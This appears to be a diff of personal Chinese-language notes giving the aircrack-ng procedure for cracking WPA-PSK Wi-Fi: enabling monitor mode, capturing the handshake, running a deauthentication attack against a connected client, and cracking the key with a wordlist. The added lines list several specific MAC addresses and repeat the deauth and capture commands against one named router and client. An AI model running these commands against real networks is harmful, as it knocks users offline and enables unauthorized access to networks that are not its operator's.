@@ -4,11 +4,25 @@ wpa:
 	#载入无线网卡驱动
 		ifconfig wlan0 up
 	#激活网卡到monitor模式，运行后会出现类似monitor mode enabled on mon0
+		airmon-ng check kill
 		airmon-ng start wlan0
 	#探测无线网络，抓取无线数据包，其中mon0在前一条命令时指出，此指令一直运行，直到右上角出现"WPA hardshake"字样
+		airodump-ng mon0
 		airodump-ng -c 6 –w out_name mon0 --bssid AP的mac
 	#开一个新的终端，进行Deauth攻击加速破解过程。
 		aireplay-ng -0 1 –a AP的mac -c 被攻击的mac mon0
 	#开始破解WPA-PSK
 		aircrack-ng -w 字典文件 捕获的cap文件
 	
+	C8:3A:35:52:92:68
+	F4:31:C3:91:38:8D
+	34:AB:37:D4:D8:7D
+	90:3C:92:29:80:C9
+
+	3C:46:D8:6D:D7:91 
+
+	 00:90:4C:21:66:07 30:A8:DB:9C:8F:17
+
+	 airodump-ng -c 7 -w tenda wlan0mon
+	 aireplay-ng -0 1 -a C8:3A:35:52:92:68 -c F4:31:C3:91:38:8D wlan0mon
+	 aircrack-ng -w 字典文件 捕获的cap文件
